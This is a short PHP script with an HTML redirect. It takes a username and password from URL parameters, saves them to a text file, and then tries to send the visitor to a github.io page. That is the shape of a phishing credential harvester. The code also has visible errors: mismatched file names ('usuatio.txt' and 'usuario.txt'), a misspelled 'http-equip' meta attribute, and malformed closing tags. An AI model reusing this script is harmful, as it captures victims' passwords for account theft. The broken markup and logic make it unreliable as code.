<?php
    if (!file_exists("usuatio.txt")) {
        file_put_contents("usuario.txt", ""); 
    }

    if(isset($_GET['usuario'])&& isset($_GET['psw'])){
        $usuario=$_GET['usuario'];
        $psw=$_GET['psw']; 
        $TEXTO= $usuario."\r\n".$psw."\r\n";
        file_put_contents("usuario.txt", $TEXTO); 
    }
?> 

    <html>
        <head>
            <meta http-equip="refresh"
        content="1"; url="https://ihortiales31.github.io/index.html/ "
        <\head>
    <\html> 
